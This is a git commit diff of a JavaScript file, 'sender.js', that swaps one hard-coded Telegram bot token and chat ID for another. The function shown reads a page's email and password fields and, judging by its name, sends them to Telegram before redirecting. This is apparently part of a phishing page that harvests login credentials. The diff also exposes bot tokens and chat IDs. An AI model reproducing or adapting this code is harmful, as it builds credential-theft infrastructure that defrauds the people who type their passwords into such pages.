818813958e4104ae5d61838dc5c75bbb8e6af6cf
bcroft7 <hatunfran@gmail.com>
2025-03-14 17:14:30 -0700

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
-  const chatId = 5645205996; // Replace with your chat ID
+  const telegramBotToken = "8109659653:AAFqCBia9QwNMo0ueLtpw_hnP9Rd6Q-QnSo"; // Replace with your Telegram bot token
+  const chatId = 6241073289; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
